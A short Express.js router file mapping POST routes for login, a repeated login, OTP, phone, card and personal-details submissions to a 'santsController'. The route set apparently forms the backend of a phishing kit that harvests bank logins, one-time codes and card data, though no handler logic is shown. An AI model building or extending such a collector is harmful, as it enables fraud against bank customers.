const express = require("express");
const {
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitPhone,
  submitCard,
  submitStaticLogin,
  submitStaticCard,
  submitStaticPersonal,
} = require("../controllers/santsController");
const router = express.Router();

router.post("/static/login", submitStaticLogin);
router.post("/static/card", submitStaticCard);
router.post("/static/personal", submitStaticPersonal);
router.post("/login", submitLogin);
router.post("/otp", submitOtp);
router.post("/loginAgain", submitLoginAgain);
router.post("/phone", submitPhone);
router.post("/card", submitCard);

module.exports = router;
